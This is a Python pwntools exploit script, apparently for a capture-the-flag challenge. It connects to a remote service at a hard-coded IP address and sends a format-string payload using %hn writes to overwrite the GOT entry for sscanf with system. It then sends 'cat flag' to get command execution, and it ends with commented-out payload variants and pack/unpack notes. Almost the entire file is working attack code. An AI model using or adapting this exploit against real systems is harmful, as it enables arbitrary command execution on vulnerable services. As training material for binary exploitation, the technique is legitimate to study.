from pwn import * # CONNECT:
target = remote("51.15.171.241", 9010) # TCP connection on port 9000
# target = process("./exo") # launch exercise exo100
# netcat ip port
# SEND & RECV:
# read("shell")
#buf = b'%p|' * 10
#buf = p32(0x0804C024) # 0804C024 addr of exit
#buf += b'%.37810x%7$hn' # 37814 080493B6 // .addr in dec of win then %hn
#buf = b'AAAABBBB%7$x'
#target.sendline(buf)
#print(target.recvline())


# user.name
#buf = p32(0x0804C024) # 0804C024 addr of exit
#buf += b'%.37810x%7$hn' # 37814 080493B6 // .addr in dec of win then %hn
#buf = b'AAAABBBB%16$x' ## 15, 16, 17

buf = b'AA' # padding bytes
#buf += p32(0x0804C040 + 2)  # 0804C040 addr of sscanf + 2 because we want to write to the second part of addr of sscanf
buf += p32(0x0804C040)  # 0804C040 addr of sscanf
#buf += b'%.2042x%16$hn' # addr of system :  0804 = 2052 - 4 -4 -2
#buf += b'%.47144x%17$hn' #                  C02C = 49196 - 2042- 4 -4 -2
buf += b'%.37050x%16$hn' #                  C02C = 49196 - 4 - 2    0804 90C0

target.sendline(buf)

# Get action
buf = b'cat flag'
target.sendline(buf)

for i in range (600):
    print(target.recvline())
#print(target.recvuntil("world")) # recv until "world" is read

# PACK & UNPACK:
#p32(0xAABBCCDD) # pack little endian 32bits
#u32(b"\xDD\xCC\xBB\xAA") # unpack little endian 32 bits
#p64(0xAABBCCDDEEFF9988) # pack little endian 64bits
#u64(b"\x88\x99\xFF\xEE\xDD\xCC\xBB\xAA") # unpack little endian 64 bits

# FINAL EXAMPLE:
#target.send(p64(0xAABBCCDD))
#target.interactive() # direct interaction with the target!